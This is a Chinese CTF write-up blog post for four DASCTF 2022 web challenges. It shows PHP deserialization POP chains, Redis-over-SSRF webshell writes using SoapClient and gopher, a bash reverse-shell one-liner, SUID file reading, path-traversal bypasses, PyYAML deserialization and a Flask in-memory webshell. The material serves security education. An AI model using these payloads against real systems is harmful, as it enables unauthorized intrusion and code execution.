---
title: "DASCTF 2022 十月赛 Web Writeup"
date: 2022-10-24T15:02:34+08:00
lastmod: 2022-10-31T15:02:34+08:00
draft: false
author: "X1r0z"

tags: ['ctf']
categories: ['web']

hiddenFromHomePage: false
hiddenFromSearch: false

toc:
  enable: true
math:
  enable: false
lightgallery: false
---

被师傅们带飞了, 混了个第三名

文章最后补充了一些预期解和官方 wp

<!--more-->

## EasyPOP

```php
<?php
highlight_file(__FILE__);
error_reporting(0);

class fine
{
    private $cmd;
    private $content;

    public function __construct($cmd, $content)
    {
        $this->cmd = $cmd;
        $this->content = $content;
    }

    public function __invoke()
    {
        call_user_func($this->cmd, $this->content);
    }

    public function __wakeup()
    {
        $this->cmd = "";
        die("Go listen to Jay Chou's secret-code! Really nice");
    }
}

class show
{
    public $ctf;
    public $time = "Two and a half years";

    public function __construct($ctf)
    {
        $this->ctf = $ctf;
    }


    public function __toString()
    {
        return $this->ctf->show();
    }

    public function show(): string
    {
        return $this->ctf . ": Duration of practice: " . $this->time;
    }


}

class sorry
{
    private $name;
    private $password;
    public $hint = "hint is depend on you";
    public $key;

    public function __construct($name, $password)
    {
        $this->name = $name;
        $this->password = $password;
    }

    public function __sleep()
    {
        $this->hint = new secret_code();
    }

    public function __get($name)
    {
        $name = $this->key;
        $name();
    }


    public function __destruct()
    {
        if ($this->password == $this->name) {

            echo $this->hint;
        } else if ($this->name = "jay") {
            secret_code::secret();
        } else {
            echo "This is our code";
        }
    }


    public function getPassword()
    {
        return $this->password;
    }

    public function setPassword($password): void
    {
        $this->password = $password;
    }


}

class secret_code
{
    protected $code;

    public static function secret()
    {
        include_once "hint.php";
        hint();
    }

    public function __call($name, $arguments)
    {
        $num = $name;
        $this->$num();
    }

    private function show()
    {
        return $this->code->secret;
    }
}


if (isset($_GET['pop'])) {
    $a = unserialize($_GET['pop']);
    $a->setPassword(md5(mt_rand()));
} else {
    $a = new show("Ctfer");
    echo $a->show();
}
```

题目环境是 php 7.4, 图省事直接把所有属性的类型都改成 public

起点是 sorry 类的 `__destruct()`, 由 `echo $this->hint` 调用到 show 类的 `__toString()` 方法, 然后通过执行 `$this->ctf->show()` 跳转 secret_code 类的 `__call()` , 进而到 `show()` 方法, 在 `show()` 方法中访问不存在的属性, 跳转到 sorry 类的 `__get()`, 最后通过 `$name()` 跳到 fine 类的 `__invoke()`

pop 链构造如下

```php
<?php

class fine
{
    public $cmd;
    public $content;
}

class show
{
    public $ctf;
    public $time;
}

class sorry
{
    public $name;
    public $password;
    public $hint;
    public $key;
}

class secret_code
{
    public $code;
}

$e = new fine();
$e->cmd = 'system';
$e->content = 'cat /flag';

$d = new sorry();
$d->key = $e;

$c = new secret_code();
$c->code = $d;

$b = new Show();
$b->ctf = $c;

$a = new sorry();
$a->name = '123';
$a->password = '123';
$a->hint = $b;

echo serialize($a);
```

最后改一下数字绕过 `__wakeup`

```
http://f9eac3ed-9425-4fe7-a009-aad41f9db212.node4.buuoj.cn:81/?pop=O:5:"sorry":4:{s:4:"name";s:3:"123";s:8:"password";s:3:"123";s:4:"hint";O:4:"show":2:{s:3:"ctf";O:11:"secret_code":1:{s:4:"code";O:5:"sorry":4:{s:4:"name";N;s:8:"password";N;s:4:"hint";N;s:3:"key";O:4:"fine":3:{s:3:"cmd";s:6:"system";s:7:"content";s:9:"cat /flag";}}}s:4:"time";N;}s:3:"key";N;}
```

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202210231752647.png)

## hade_waibo

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202210231753442.png)

cancan need 有任意文件读取

```
http://745b93ee-b378-4803-b84e-52f9e7b78d2a.node4.buuoj.cn:81/file.php?m=show&filename=file.php
```

file.php

```php
............
<?php
error_reporting(0);
session_start();
include 'class.php';

if($_SESSION['isLogin'] !== true){
	die("<script>alert('号登一下谢谢。');location.href='index.php'</script>");
}
$form = '
<form action="file.php?m=upload" method="post" enctype="multipart/form-data" >
    <input type="file" name="file">
    <button class="mini ui button" ><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
  提交
</font></font></button>
</form>';



$file = new file();
switch ($_GET['m']) {

	case 'upload':
		if(empty($_FILES)){die($form);}

		$type = end(explode(".", $_FILES['file']['name']));
		if ($file->check($type)) {
			die($file->upload($type));
		}else{
			die('你食不食油饼🤬');
		}
		break;

	case 'show':
		die($file->show($_GET['filename']));
		break;

	case 'rm':
		$file->rmfile();
		die("全删干净了捏😋");
		break;

	case 'logout':
		session_destroy();
		die("<script>alert('已退出登录');location.href='index.php'</script>");
		break;

	default:
		echo '<h2>Halo! '.$_SESSION['username'].'</h2>';
		break;
}
?>
............
```

class.php

```php
<?php
class User
{
    public $username;
    public function __construct($username){
        $this->username = $username;
        $_SESSION['isLogin'] = True;
        $_SESSION['username'] = $username;
    }
    public function __wakeup(){
        $cklen = strlen($_SESSION["username"]);
        if ($cklen != 0 and $cklen <= 6) {
            $this->username = $_SESSION["username"];
        }
    }
    public function __destruct(){
        if ($this->username == '') {
            session_destroy();
        }
    }
}

class File
{
    #更新黑名单为白名单，更加的安全
    public $white = array("jpg","png");

    public function show($filename){
        echo '<div class="ui action input"><input type="text" id="filename" placeholder="Search..."><button class="ui button" onclick="window.location.href=\'file.php?m=show&filename=\'+document.getElementById(\'filename\').value">Search</button></div><p>';
        if(empty($filename)){die();}
        return '<img src="data:image/png;base64,'.base64_encode(file_get_contents($filename)).'" />';
    }
    public function upload($type){
        $filename = "dasctf".md5(time().$_FILES["file"]["name"]).".$type";
        move_uploaded_file($_FILES["file"]["tmp_name"], "upload/" . $filename);
        return "Upload success! Path: upload/" . $filename;
    }
    public function rmfile(){
        system('rm -rf /var/www/html/upload/*');
    }
    public function check($type){
        if (!in_array($type,$this->white)){
            return false;
        }
        return true;
    }

}

#更新了一个恶意又有趣的Test类
class Test
{
    public $value;

    public function __destruct(){
        chdir('./upload');
        $this->backdoor();
    }
    public function __wakeup(){
        $this->value = "Don't make dream.Wake up plz!";
    }
    public function __toString(){
        $file = substr($_GET['file'],0,3);
        file_put_contents($file, "Hack by $file !");
        return 'Unreachable! :)';
    }
    public function backdoor(){
        if(preg_match('/[A-Za-z0-9?$@]+/', $this->value)){
            $this->value = 'nono~';
        }
        system($this->value);
    }

}
```

Test 类可以利用, 第一时间想的是 phar 反序列化

可以用 `.` 执行命令来绕过正则

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202210231758660.png)

思路就是先上传 phar 文件, 然后上传一个 jpg, 其内容包含要执行的命令

注意 jpg 的名称要在 phar 的前面, 例如 phar 的名称是 `dasctfe4.jpg`, 包含命令的 jpg 名称必须是 `dasctfc2.jpg` 或者 `dasctf01.jpg` (ascii 码较小)

不过试的时候发现绕过 wakeup 好像不太行...

然后想起来做 EasyLove 题的时候根目录下有个 start.sh 部署脚本, 结合题目的描述 `tips:flag在/目录下的一个文件里`, 索性直接读取 start.sh 看看

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202210231801987.png)

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202210231803463.png)

读取 /ghjsdk_F149_H3re_asdasfc 得到 flag

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202210231804991.png)

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202210231804073.png)

## EasyLove

```php
<?php
highlight_file(__FILE__);
error_reporting(0);
class swpu{
    public $wllm;
    public $arsenetang;
    public $l61q4cheng;
    public $love;

    public function __construct($wllm,$arsenetang,$l61q4cheng,$love){
        $this->wllm = $wllm;
        $this->arsenetang = $arsenetang;
        $this->l61q4cheng = $l61q4cheng;
        $this->love = $love;
    }
    public function newnewnew(){
        $this->love = new $this->wllm($this->arsenetang,$this->l61q4cheng);
    }

    public function flag(){
        $this->love->getflag();
    }

    public function __destruct(){
        $this->newnewnew();
        $this->flag();
    }
}
class hint{
    public $hint;
    public function __destruct(){
        echo file_get_contents($this-> hint.'hint.php');
    }
}
$hello = $_GET['hello'];
$world = unserialize($hello);
```

根据题目描述的 redis, 猜测是通过 ssrf + redis 来 getshell

`$this->love = new $this->wllm($this->arsenetang,$this->l61q4cheng);` 这句很明显是要通过某个类来执行 ssrf

众所周知 redis 的协议很宽松, 支持用 http 来发包, 而 php 原生的 SoapClient 类可以发送 http

payload 如下

```php
<?php

class swpu{
    public $wllm;
    public $arsenetang;
    public $l61q4cheng;
    public $love;
}

$a = new swpu();
$a->wllm = 'SoapClient';
$a->arsenetang = null;
$target = 'http://127.0.0.1:6379/';
$poc = "flushall\r\nconfig set dir /var/www/html/\r\nconfig set dbfilename shell.php\r\nset xzxzxz '<?=eval(\$_REQUEST[1])?>'\r\nsave";

$a->l61q4cheng = array('location'=>$target, 'uri'=>"hello\r\n".$poc."\r\nhello");
echo urlencode(serialize($a));
```

试的时候一直卡住 (正常现象), 访问 shell.php 也显示 404

于是猜测 redis 可能有认证, 看了下题目有 hint 类, 通过 `file_get_contents()` 来获得 hint.php 的内容

直接反序列化 hint 无回显, 结果想试试 `file_get_contents()` + gopher 的时候阴差阳错地读到了 hint.php

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202210231829355.png)

```php
<?php

class hint{
    public $hint;
}
$a = new hint();
$a->hint = 'gopher://127.0.0.1:6379/_%2A1%0D%0A%248%0D%0Aflushall%0D%0A%2A3%0D%0A%243%0D%0Aset%0D%0A%241%0D%0A1%0D%0A%2422%0D%0A%0A%0A%3C%3Fphp%20phpinfo%28%29%3B%3F%3E%0A%0A%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%243%0D%0Adir%0D%0A%2413%0D%0A/var/www/html%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%2410%0D%0Adbfilename%0D%0A%249%0D%0Ashell.php%0D%0A%2A1%0D%0A%244%0D%0Asave%0D%0A%0A';
echo serialize($a);
```

```
http://0021bfdb-5d2b-42ff-9505-49d23c4aa0e2.node4.buuoj.cn:81/?hello=O:4:"hint":1:{s:4:"hint";s:404:"gopher://127.0.0.1:6379/_%2A1%0D%0A%248%0D%0Aflushall%0D%0A%2A3%0D%0A%243%0D%0Aset%0D%0A%241%0D%0A1%0D%0A%2422%0D%0A%0A%0A%3C%3Fphp%20phpinfo%28%29%3B%3F%3E%0A%0A%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%243%0D%0Adir%0D%0A%2413%0D%0A/var/www/html%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%2410%0D%0Adbfilename%0D%0A%249%0D%0Ashell.php%0D%0A%2A1%0D%0A%244%0D%0Asave%0D%0A%0A";}
```

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202210231830188.png)

猜测 20220311 就是 redis 的密码

于是最终 payload 如下

```php
<?php

class swpu{
    public $wllm;
    public $arsenetang;
    public $l61q4cheng;
    public $love;
}

$a = new swpu();
$a->wllm = 'SoapClient';
$a->arsenetang = null;
$target = 'http://127.0.0.1:6379/';
$poc = "auth 20220311\r\nflushall\r\nconfig set dir /var/www/html/\r\nconfig set dbfilename shell.php\r\nset xzxzxz '<?=eval(\$_REQUEST[1])?>'\r\nsave";

$a->l61q4cheng = array('location'=>$target, 'uri'=>"hello\r\n".$poc."\r\nhello");
echo urlencode(serialize($a));
```

```
O%3A4%3A%22swpu%22%3A4%3A%7Bs%3A4%3A%22wllm%22%3Bs%3A10%3A%22SoapClient%22%3Bs%3A10%3A%22arsenetang%22%3BN%3Bs%3A10%3A%22l61q4cheng%22%3Ba%3A2%3A%7Bs%3A8%3A%22location%22%3Bs%3A22%3A%22http%3A%2F%2F127.0.0.1%3A6379%2F%22%3Bs%3A3%3A%22uri%22%3Bs%3A145%3A%22hello%0D%0Aauth+20220311%0D%0Aflushall%0D%0Aconfig+set+dir+%2Fvar%2Fwww%2Fhtml%2F%0D%0Aconfig+set+dbfilename+shell.php%0D%0Aset+xzxzxz+%27%3C%3F%3Deval%28%24_REQUEST%5B1%5D%29%3F%3E%27%0D%0Asave%0D%0Ahello%22%3B%7Ds%3A4%3A%22love%22%3BN%3B%7D
```

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202210231832077.png)

访问 shell.php

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202210231833180.png)

蚁剑连接, 发现 flag 打不开

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202210231833251.png)

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202210231834534.png)

root 权限, 估计是要提权

先用 bash 反弹 shell, 直接输入会有点问题, 解决方法是先在 bash.sh 里写入反弹命令, 然后通过 `bash bash.sh` 来执行

```bash
bash -i >& /dev/tcp/xxxx/yyyy 0>&1
```

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202210231836286.png)

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202210231837760.png)

查找带 SUID 的文件

```bash
find / -perm -u=s -type f 2>/dev/null
```

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202210231839463.png)

发现有 date, 于是直接用 date 来读取 flag

```bash
date -f /hereisflag/flllll111aaagg
```

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202210231839756.png)

## BlogSystem[复现]

随便注册一个用户

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202210311601414.png)

点 blog 查看文章

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202210311602854.png)

点开最后一篇 `flask 基础总结`

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202210311603552.png)

伪造 session 的 secret_key 在这里面, 只能说出题人脑洞是真的大...

之后伪造用户为 admin

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202210311605528.png)

刷新网页后多了 download 选项

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202210311606108.png)

存在任意文件读取

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202210311607555.png)

发现会将 `..` 和 `//` 替换成空, 用如图的 payload 绕过

下面读取相关源码

```
.//././/./app.py
.//././/./view/index.py
.//././/./view/blog.py
.//././/./requirements.txt
```

app.py (从开头很容易就能推出来 view 目录下源码对应的文件名)

```python
from flask import *
import config

app = Flask(__name__)
app.config.from_object(config)
app.secret_key = '7his_1s_my_fav0rite_ke7'
from model import *
from view import *

app.register_blueprint(index, name='index')
app.register_blueprint(blog, name='blog')


@app.context_processor
def login_statue():
    username = session.get('username')
    if username:
        try:
            user = User.query.filter(User.username == username).first()
            if user:
                return {"username": username, 'name': user.name, 'password': user.password}
        except Exception as e:
            return e
    return {}


@app.errorhandler(404)
def page_not_found(e):
    return render_template('404.html'), 404


@app.errorhandler(500)
def internal_server_error(e):
    return render_template('500.html'), 500


if __name__ == '__main__':
    app.run('0.0.0.0', 80)
```

view/index.py

```python
from flask import Blueprint, session, render_template, request, flash, redirect, url_for, Response, send_file
from werkzeug.security import check_password_hash
from decorators import login_limit, admin_limit
from model import *
import os

index = Blueprint("index", __name__)


@index.route('/')
def hello():
    return render_template('index.html')


@index.route('/register', methods=['POST', 'GET'])
def register():
    if request.method == 'GET':
        return render_template('register.html')
    if request.method == 'POST':
        name = request.form.get('name')
        username = request.form.get('username')
        password = request.form.get('password')
        user = User.query.filter(User.username == username).first()
        if user is not None:
            flash("该用户名已存在")
            return render_template('register.html')
        else:
            user = User(username=username, name=name)
            user.password_hash(password)
            db.session.add(user)
            db.session.commit()
            flash("注册成功！")
            return render_template('register.html')


@index.route('/login', methods=['POST', 'GET'])
def login():
    if request.method == 'GET':
        return render_template('login.html')
    if request.method == 'POST':
        username = request.form.get('username')
        password = request.form.get('password')
        user = User.query.filter(User.username == username).first()
        if (user is not None) and (check_password_hash(user.password, password)):
            session['username'] = user.username
            session.permanent = True
            return redirect(url_for('index.hello'))
        else:
            flash("账号或密码错误")
            return render_template('login.html')


@index.route("/updatePwd", methods=['POST', 'GET'])
@login_limit
def update():
    if request.method == "GET":
        return render_template("updatePwd.html")
    if request.method == 'POST':
        lodPwd = request.form.get("lodPwd")
        newPwd1 = request.form.get("newPwd1")
        newPwd2 = request.form.get("newPwd2")
        username = session.get("username")
        user = User.query.filter(User.username == username).first()
        if check_password_hash(user.password, lodPwd):
            if newPwd1 != newPwd2:
                flash("两次新密码不一致！")
                return render_template("updatePwd.html")
            else:
                user.password_hash(newPwd2)
                db.session.commit()
                flash("修改成功！")
                return render_template("updatePwd.html")
        else:
            flash("原密码错误！")
            return render_template("updatePwd.html")


@index.route('/download', methods=['GET'])
@admin_limit
def download():
    if request.args.get('path'):
        path = request.args.get('path').replace('..', '').replace('//', '')
        path = os.path.join('static/upload/', path)
        if os.path.exists(path):
            return send_file(path)
        else:
            return render_template('404.html', file=path)
    return render_template('sayings.html',
                           yaml='所谓『恶』，是那些只为了自己，利用和践踏弱者的家伙！但是，我虽然是这样，也知道什么是令人作呕的『恶』，所以，由我来制裁！')


@index.route('/logout')
def logout():
    session.clear()
    return redirect(url_for('index.hello'))
```

view/blog.py

```python
import os
import random
import re
import time

import yaml
from flask import Blueprint, render_template, request, session
from yaml import Loader

from decorators import login_limit, admin_limit
from model import *

blog = Blueprint("blog", __name__, url_prefix="/blog")


def waf(data):
    if re.search(r'apply|process|eval|os|tuple|popen|frozenset|bytes|type|staticmethod|\(|\)', str(data), re.M | re.I):
        return False
    else:
        return True


@blog.route('/writeBlog', methods=['POST', 'GET'])
@login_limit
def writeblog():
    if request.method == 'GET':
        return render_template('writeBlog.html')
    if request.method == 'POST':
        title = request.form.get("title")
        text = request.form.get("text")
        username = session.get('username')
        create_time = time.strftime("%Y-%m-%d %H:%M:%S")
        user = User.query.filter(User.username == username).first()
        blog = Blog(title=title, text=text, create_time=create_time, user_id=user.id)
        db.session.add(blog)
        db.session.commit()
        blog = Blog.query.filter(Blog.create_time == create_time).first()
        return render_template('blogSuccess.html', title=title, id=blog.id)


@blog.route('/imgUpload', methods=['POST'])
@login_limit
def imgUpload():
    try:
        file = request.files.get('editormd-image-file')
        fileName = file.filename.replace('..','')
        filePath = os.path.join("static/upload/", fileName)
        file.save(filePath)
        return {
            'success': 1,
            'message': '上传成功!',
            'url': "/" + filePath
        }
    except Exception as e:
        return {
            'success': 0,
            'message': '上传失败'
        }


@blog.route('/showBlog/<id>')
def showBlog(id):
    blog = Blog.query.filter(Blog.id == id).first()
    comment = Comment.query.filter(Comment.blog_id == blog.id)
    return render_template("showBlog.html", blog=blog, comment=comment)


@blog.route("/blogAll")
def blogAll():
    blogList = Blog.query.order_by(Blog.create_time.desc()).all()
    return render_template('blogAll.html', blogList=blogList)


@blog.route("/update/<id>", methods=['POST', 'GET'])
@login_limit
def update(id):
    if request.method == 'GET':
        blog = Blog.query.filter(Blog.id == id).first()
        return render_template('updateBlog.html', blog=blog)
    if request.method == 'POST':
        id = request.form.get("id")
        title = request.form.get("title")
        text = request.form.get("text")
        blog = Blog.query.filter(Blog.id == id).first()
        blog.title = title
        blog.text = text
        db.session.commit()
        return render_template('blogSuccess.html', title=title, id=id)


@blog.route("/delete/<id>")
@login_limit
def delete(id):
    blog = Blog.query.filter(Blog.id == id).first()
    db.session.delete(blog)
    db.session.commit()
    return {
        'state': True,
        'msg': "删除成功！"
    }


@blog.route("/myBlog")
@login_limit
def myBlog():
    username = session.get('username')
    user = User.query.filter(User.username == username).first()
    blogList = Blog.query.filter(Blog.user_id == user.id).order_by(Blog.create_time.desc()).all()
    return render_template("myBlog.html", blogList=blogList)


@blog.route("/comment", methods=['POST'])
@login_limit
def comment():
    text = request.values.get('text')
    blogId = request.values.get('blogId')
    username = session.get('username')
    create_time = time.strftime("%Y-%m-%d %H:%M:%S")
    user = User.query.filter(User.username == username).first()
    comment = Comment(text=text, create_time=create_time, blog_id=blogId, user_id=user.id)
    db.session.add(comment)
    db.session.commit()
    return {
        'success': True,
        'message': '评论成功！',
    }


@blog.route('/myComment')
@login_limit
def myComment():
    username = session.get('username')
    user = User.query.filter(User.username == username).first()
    commentList = Comment.query.filter(Comment.user_id == user.id).order_by(Comment.create_time.desc()).all()
    return render_template("myComment.html", commentList=commentList)


@blog.route('/deleteCom/<id>')
def deleteCom(id):
    com = Comment.query.filter(Comment.id == id).first()
    db.session.delete(com)
    db.session.commit()
    return {
        'state': True,
        'msg': "删除成功！"
    }


@blog.route('/saying', methods=['GET'])
@admin_limit
def Saying():
    if request.args.get('path'):
        file = request.args.get('path').replace('../', 'hack').replace('..\\', 'hack')
        try:
            with open(file, 'rb') as f:
                f = f.read()
                if waf(f):
                    print(yaml.load(f, Loader=Loader))
                    return render_template('sayings.html', yaml='鲁迅说：当你看到这句话时，还没有拿到flag，那就赶紧重开环境吧')
                else:
                    return render_template('sayings.html', yaml='鲁迅说：你说得不对')
        except Exception as e:
            return render_template('sayings.html', yaml='鲁迅说：'+str(e))
    else:

        with open('view/jojo.yaml', 'r', encoding='utf-8') as f:
            sayings = yaml.load(f, Loader=Loader)
            saying = random.choice(sayings)
            return render_template('sayings.html', yaml=saying)
```

requirements.txt

```
PyYAML~=6.0
Flask==2.0.2
Werkzeug~=2.2.2
SQLAlchemy~=1.4.41
flask_sqlalchemy~=2.5.1
PyMySQL~=1.0.2
```

/saying 路由存在 PyYAML 反序列化, 并且有 waf 过滤

参考文章 [https://www.tr0y.wang/2022/06/06/SecMap-unserialize-pyyaml](https://www.tr0y.wang/2022/06/06/SecMap-unserialize-pyyaml)

大多数关键词都被过滤了, 虽然可以用 `python/object/new` 导入模块, 但是过滤了 os 和 subprocess, 并且也用不了 builtins (tuple 被过滤)

```python
!!python/object/new:time.sleep
- 5
```

然后又看到了 ` python/module`, 并且刚好 writeblog 的时候可以上传文件, 于是猜测是要利用该标签导入模块来执行 python 代码

模块利用的是 /static/upload 目录, payload 如下

```python
!!python/module:static.upload
```

这里好像只能通过 `__init__.py` 来执行, 不能写成 `static.upload!exp` (static 目录下没有 `__init__.py` ?)

注意模块只能导入一次, 即 `__init__.py` 中的代码只能执行一次, 否则只能重开环境, 所以考虑使用 flask 内存马

参考文章 [https://xz.aliyun.com/t/10933](https://xz.aliyun.com/t/10933)

```python
from flask import *

url_for.__globals__['__builtins__']['eval']("app.add_url_rule('/shell', 'shell', lambda :__import__('os').popen(_request_ctx_stack.top.request.args.get('cmd', 'whoami')).read())",{'_request_ctx_stack':url_for.__globals__['_request_ctx_stack'],'app':url_for.__globals__['current_app']})
```

最后依次上传对应文件, 访问 /saying 传参 path 来反序列化 yaml

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202210311621253.png)

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202210311621759.png)

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202210311621319.png)

访问 /shell 执行命令

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202210311622751.png)

查看 flag

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202210311622264.png)

## 补充

easypop 环境有问题, 预期解的方法是利用 fast destruct

[https://github.com/php/php-src/issues/9618](https://github.com/php/php-src/issues/9618)

EasyLove 那步能出来 hint 的原因是 payload 中有 `%0a`, 不过具体原理是啥还不太清楚... 其实应该用 php://filter, 只是需要注意绝对路径, 当时没反应过来

BlogSystem 的 secret key 藏在文章里我是真的没想到, 伪造 session 之后就是任意文件读取 + pyyaml 反序列化

最后 hade_waibo 的预期解简单说一下

这题并不是让你去绕过 \_\_wakeup, 而是要巧妙地利用两个类 \_\_wakeup 的执行顺序来控制参数

先来看一个简单的 demo

```php
<?php

class A{
    public function __wakeup()
    {
        echo "A wakeup\n";
    }
}

class B{
    public function __wakeup()
    {
        echo "B wakeup\n";
    }
}

$a = new A();
$b = new B();
$a->test = $b;
unserialize(serialize($a));
```

```
B wakeup
A wakeup
```

可以看到 B 的 wakeup 先于 a 执行, 所以猜测反序列化时 php 会先对属性进行反序列化, 并执行属性的 \_\_wakeup, 最后才执行这个类本身的 \_\_wakeup

回到题目源码

```php
<?php

class User
{
......
    public function __wakeup(){
        $cklen = strlen($_SESSION["username"]);
        if ($cklen != 0 and $cklen <= 6) {
            $this->username = $_SESSION["username"];
        }
    }
......
}

......

class Test
{
    public $value;

    public function __destruct(){
        chdir('./upload');
        $this->backdoor();
    }
    public function __wakeup(){
        $this->value = "Don't make dream.Wake up plz!";
    }
......
    public function backdoor(){
        if(preg_match('/[A-Za-z0-9?$@]+/', $this->value)){
            $this->value = 'nono~';
        }
        var_dump($this->value);
    }

}
```

Test 类中的 \_\_wakeup 会对 value 进行污染导致无法执行指定命令, 但是在了解了上面的 demo 之后我们可以让 User 类的 \_\_wakeup 延后执行, 并将 value 的引用赋给 username, 最终利用 `$_SESSION['username']` 来间接赋值

```php
<?php

class User
{
    public $username;
    public function __wakeup(){
        $cklen = strlen($_SESSION['username']);
        if ($cklen != 0 and $cklen <= 6) {
            $this->username = $_SESSION['username'];
        }
    }
    public function __destruct(){
        if ($this->username == '') {
            session_destroy();
        }
    }

}

class Test
{
    public $value;
    public function __wakeup()
    {
        $this->value = "Don't make dream.Wake up plz!";
    }
    public function __destruct()
    {
        echo $this->value;
    }
}

$_SESSION['username'] = '* /*';

$test = new Test();
$user = new User();
$user->a = $test;
$user->username = &$test->value;
unserialize(serialize($user));
```

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202210281827223.png)

wp 中通过 `* /*` 查看 flag, `*` 会依照 ascii 码顺序将当前目录下的某个文件作为命令来执行, 并将剩余文件名作为参数 (参考 n 字节限制下的命令执行)

执行之前创建了 cat 文件, 这一步的利用方法就不写了, 就是通过 User 类的 \_\_wakeup 或者 \_\_destruct 来触发 Test 类的 \_\_toString 方法

很巧的是创建的 cat 文件第一个字母是 c, 而上传文件时保存图片的文件名是 `dasctf + md5 + 后缀`, dasctf 首字母是 d, 这样就确保了 `*` 匹配到作为命令的文件名一定是 cat

[官方 writeup](https://pan.baidu.com/s/1WpKBYZ5kAYPbdSapciDk_Q?pwd=DAS1)
